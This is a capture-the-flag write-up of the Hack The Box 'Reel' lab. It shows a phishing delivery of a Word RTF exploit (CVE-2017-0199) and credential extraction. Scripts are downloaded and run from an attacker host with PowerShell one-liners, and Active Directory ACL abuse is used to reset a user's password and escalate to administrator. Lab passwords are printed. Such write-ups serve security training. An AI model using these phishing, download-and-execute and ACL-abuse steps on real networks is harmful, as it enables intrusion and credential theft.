This box is part of the Active Directory 101 path, which is why I took a look at it.

## Enumeration
```
sudo nmap -sS -p- 10.10.10.77
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-24 16:24 EDT

```

The FTP share has multiple files. One of them prompts us to send `.rtf` files. Another gives details on applocker rules. 

We can find a mail address using `exiftool`:
```
exiftool Windows\ Event\ Forwarding.docx 
[...]
Creator                         : nico@megabank.com
[...]
```

## Foothold
When searching for `rtf` and remote code execution one of the first things, that comes up is CVE-2017-0199 which is a Microsoft Word vulnerability, that existed around the time the box was released. There is an exploit in `metasploit` from around that time:
```
exploit/windows/fileformat/office_word_hta
```
This gives us a file, which we then can send via email to the box:

```
sudo sendEmail -t nico@megabank.com -f techsupport@megabank.com -s 10.10.10.77 -u "Important Stuff" -a /root/.msf4/local/msf.doc
```
I had to play around with the ports a bit, but port 80 and port 443 seem to be reachable by the machine and this gave me a shell.

There is the flag as well as credentials on our Desktop:
```
C:\Users\nico\Desktop>type user.txt

```
We can get credentials from this:
```
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"


UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

We can use the user tom to log in over ssh.

## Privilege escalation
We can run PrivescCheck, which does give us the credentials for the `nico` user:
```
PS C:\Users\tom> iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/PrivescCheck.ps1')                             
PS C:\Users\tom> Invoke-PrivescCheck
[...]

There were some files from an AD audit left on the machine. However, I found it easier to collect new data for BloodHound. For this I used the PowerShell collector:
```
PS C:\Users\tom> iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/SharpHound.ps1')                             
PS C:\Users\tom> Invoke-BloodHound -CollectionMethod All
```

There were several interesting edges in the bloodhound data. Our user is a member of the `Print Operators`-Group, which is why we can log in on the DC. As we are in this group we should be able to load a vulnerable driver and escalate our privileges this way. However, as we have some AppLocker rules and as this is an Active Directory box this is probably not the intended path.

Our user also has `WriteOwner`-Permissions on the `claire` user:

![[htb_reel_attack_path_two.png]]

The `claire` user has `GenericWrite` and `WriteDacl`-Permissions on a `backups_admins`-Group:
![[htb_reel_attack_path_three.png]]
Being a member of this group might allow us to back up for example the `NTDS.DIT` file. So my initial assumption is, that this might be the intended path here. The `nico` user has very similar properties to the `tom` user, however, as we have credentials for `tom` it seems easier to use the `tom` user.

Setting ourselves as the owner of `claire`:
```
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
```
Giving us `GenericAll` on `claire`:
```
Add-DomainObjectAcl -TargetIdentity claire -Rights All -PrincipalIdentity tom
```
Change password of `claire`:
```
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword
```

Creating a credentials object for `claire` to continue:
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force 
$Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $SecPassword)
```

Giving us the right to add members:
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "BACKUP_ADMINS" -Rights WriteMembers -PrincipalIdentity claire
```
Adding `tom` as a group member:

```
Add-DomainGroupMember -Identity 'BACKUP_ADMINS' -Members 'tom' -Credential $Cred
```

Verifying, that this worked:
```
Get-DomainGroupMember -Identity 'BACKUP_ADMINS'
```

The `icacls` tool tells us, that we have access to the home folder of `Administrator` if we are a member of the `Backup_Admins`-Group. On the desktop of this user we find a script with the password for the user in it:
```
tom@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                    
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"
[...]
```
We can then log in over ssh and get the root flag:
```
